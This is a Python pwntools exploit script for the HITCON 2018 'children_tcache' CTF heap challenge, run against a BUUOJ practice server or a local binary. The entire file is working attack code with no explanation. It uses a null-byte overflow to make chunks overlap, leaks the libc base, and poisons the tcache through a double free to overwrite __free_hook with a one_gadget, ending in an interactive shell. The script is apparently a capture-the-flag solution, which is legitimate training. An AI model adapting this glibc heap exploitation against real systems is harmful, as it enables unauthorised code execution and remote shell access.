#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./HITCON_2018_children_tcache')
	elf = ELF('./HITCON_2018_children_tcache',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

else:
	p = remote('node3.buuoj.cn',25235)
	elf = ELF('./HITCON_2018_children_tcache',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def menu(cmd):
    sla("Your choice: ",str(cmd))

def add(sz,ct):
    menu(1)
    sla("Size:",str(sz))
    sla("Data:",ct)

def show(idx):
    menu(2)
    sla("Index:",str(idx))

def delete(idx):
    menu(3)
    sla("Index:",str(idx))


###chunk overlapping###
add(0x508,'AAAA') #0
add(0x28,'BBBB') #1
add(0x4f8,'CCCC') #2
add(0x20,'/bin/sh\x00') #3

delete(0)
delete(1)

add(0x28,'A'*0x28)#0
for i in range(0x28,0x20,-1):
    delete(0)
    add(i,'A'*i)
delete(0)

add(0x22,'a'*0x20 + '\x40' + '\x05')#0
delete(2)

###leak libc###
add(0x508,'AAAAAAAA')#1

show(0)
libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 96 - 0x3ebc40
success(hex(libc_base))

###double free###
add(0x20,'AAAA')#2

delete(0)
delete(2)

free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
one_gadget = libc_base + 0x4f322

add(0x28,p64(free_hook))#0
add(0x28,p64(free_hook))#2

add(0x28,p64(one_gadget))

###get shell##
delete(2)
ia()